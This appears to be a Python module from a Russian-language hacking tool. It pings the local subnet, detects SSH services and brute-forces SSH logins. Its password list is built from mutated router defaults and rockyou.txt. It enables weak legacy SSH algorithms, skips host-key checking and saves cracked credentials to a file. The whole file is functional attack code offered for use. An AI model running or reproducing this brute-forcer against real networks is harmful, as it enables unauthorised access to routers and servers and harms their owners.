import os, sys, socket, queue, time
import asyncio
import asyncssh
import warnings
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from .config import C, SSH_PORTS, ROUTER_USERNAMES, ROUTER_PASSWORDS_BASE, FOUND_CREDS
from .utils import (progress_line, progress_end, get_local_ip, ping, beep)
from .wordlists import load_lines, get_wordlist_path

# Отключаем спам и предупреждения
warnings.filterwarnings("ignore")
logging.getLogger('asyncssh').setLevel(logging.CRITICAL)

def detect_ssh_on_ip(ip, timeout=1.5):
    out = []
    for port in SSH_PORTS:
        try:
            s = socket.socket(); s.settimeout(timeout)
            if s.connect_ex((ip, port)) == 0:
                try:
                    s.settimeout(1.5)
                    b = s.recv(256).decode('utf-8','ignore').strip()
                    if b.startswith('SSH-'): out.append((port, b))
                except: out.append((port, 'SSH'))
            s.close()
        except: pass
    return out

def scan_network_for_ssh():
    local = get_local_ip()
    if not local: return []
    prefix = '.'.join(local.split('.')[:3])
    ips = [f"{prefix}.{i}" for i in range(1,255)]
    alive = []; done = 0
    print(f"{C.DIM}Ping sweep...{C.RESET}")
    with ThreadPoolExecutor(max_workers=64) as ex:
        futs = {ex.submit(ping, ip, 1): ip for ip in ips}
        for fut in as_completed(futs):
            done += 1
            if fut.result(): alive.append(futs[fut])
            progress_line(f"ping {done}/254 · живых {len(alive)}")
    progress_end()
    if not alive: return []
    out = []; done = 0
    print(f"{C.DIM}Проверяю SSH...{C.RESET}")
    with ThreadPoolExecutor(max_workers=64) as ex:
        futs = {ex.submit(detect_ssh_on_ip, ip, 1.5): ip for ip in alive}
        for fut in as_completed(futs):
            done += 1
            ip = futs[fut]; found = fut.result()
            if found:
                progress_end()
                for p, b in found:
                    print(f"  {C.GREEN}✓{C.RESET} {ip}:{p}  {C.DIM}{b[:60]}{C.RESET}")
                    out.append((ip, p, b))
            else:
                progress_line(f"[{done}/{len(alive)}] · SSH: {len(out)}")
    progress_end()
    return out

async def try_ssh_async(ip, port, user, pw, timeout=3):
    try:
        async with asyncssh.connect(
            ip, port=port, username=user, password=pw,
            known_hosts=None,
            login_timeout=timeout,
            kex_algs=['diffie-hellman-group14-sha1', 'diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha256'],
            encryption_algs=['aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-cbc', '3des-cbc'],
        ):
            return True
    except (asyncssh.Error, asyncio.TimeoutError, OSError):
        return False

def _fast_ssh_brute(ip, port, users, threads=20, delay=0,
                    wordlist_name=None, custom_passwords=None):
    
    async def run_async():
        # Очередь с ограничением памяти (не более 2000 элементов одновременно)
        q = asyncio.Queue(maxsize=2000)
        found = []
        found_event = asyncio.Event()
        start_time = time.time()
        stats = {'done': 0, 'total': 0}

        async def producer():
            def add_combo(u, pw):
                stats['total'] += 1
                return (u, pw)

            if custom_passwords:
                for pw in custom_passwords:
                    for u in users:
                        await q.put(add_combo(u, pw))
            elif wordlist_name:
                rp = get_wordlist_path(wordlist_name)
                if not rp:
                    print(f"{C.RED}❌ Файл {wordlist_name} не найден{C.RESET}")
                    for _ in range(threads): await q.put(None)
                    return
                # Читаем файл построчно, не загружая в память целиком
                with open(rp, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        pw = line.strip()
                        if pw:
                            for u in users:
                                await q.put(add_combo(u, pw))
            else:
                # Мутации базовых
                muts = set()
                years = [str(y) for y in range(2018, 2027)]
                suf = ["", "1", "12", "123", "1234", "12345", "!", "@", "#", "1!", "123!", "2023", "2024", "2025", "2026"]
                pre = ["", "!", "@"]
                for w in ROUTER_PASSWORDS_BASE:
                    variants = {w.lower(), w.capitalize(), w.upper()}
                    for v in list(variants):
                        muts.add(v)
                        for s in suf: muts.add(v + s)
                        for p in pre: muts.add(p + v)
                        for yr in years: muts.add(v + yr); muts.add(v + yr + "!")
                
                for pw in muts:
                    for u in users:
                        await q.put(add_combo(u, pw))
                        
                rp = get_wordlist_path('rockyou.txt')
                if rp:
                    # Так же построчно читаем rockyou
                    with open(rp, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            pw = line.strip()
                            if pw:
                                for u in users:
                                    await q.put(add_combo(u, pw))
            
            for _ in range(threads):
                await q.put(None)

        async def worker():
            while not found_event.is_set():
                item = await q.get()
                if item is None:
                    break
                
                user, pw = item
                ok = await try_ssh_async(ip, port, user, pw)
                stats['done'] += 1
                q.task_done()
                
                if ok and not found_event.is_set():
                    found.append((user, pw))
                    found_event.set()
                    try:
                        with open(FOUND_CREDS, 'a') as f:
                            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {ip}:{port} | {user}:{pw}\n")
                    except: pass
                    break
                
                if stats['done'] % 100 == 0:
                    elapsed = time.time() - start_time
                    speed = stats['done'] / elapsed if elapsed > 0 else 0
                    progress_line(f"[{stats['done']}/{stats['total'] if stats['total'] > 0 else '?'}] · скорость {speed:.0f} поп/с")

        prod_task = asyncio.create_task(producer())
        workers = [asyncio.create_task(worker()) for _ in range(threads)]
        
        await found_event.wait()
        
        # Если нашли — жестко отменяем все задачи
        prod_task.cancel()
        for w in workers:
            w.cancel()
        
        try:
            await asyncio.gather(prod_task, *workers, return_exceptions=True)
        except:
            pass
            
        progress_end()
        return found, stats['done']

    print(f"\n{C.BOLD}[SSH Brute · ASYNC STREAM]{C.RESET} {ip}:{port}")
    print(f"  {C.DIM}Потоков: {threads} | Источник: {wordlist_name or ('Свои пароли' if custom_passwords else 'Мутации + rockyou')}{C.RESET}\n")

    try:
        found, total_checked = asyncio.run(run_async())
    except KeyboardInterrupt:
        print(f"\n  {C.YELLOW}Прервано{C.RESET}")
        return []

    if found:
        for u, p in found:
            print(f"\n  {C.GREEN}{C.BOLD}🔓 НАЙДЕНО: {u}:{p}{C.RESET}")
            beep()
        print(f"  {C.GREEN}Сохранено в {FOUND_CREDS}{C.RESET}")
    else:
        print(f"\n  {C.DIM}Проверено {total_checked:,} — не подобрано{C.RESET}")
    return found
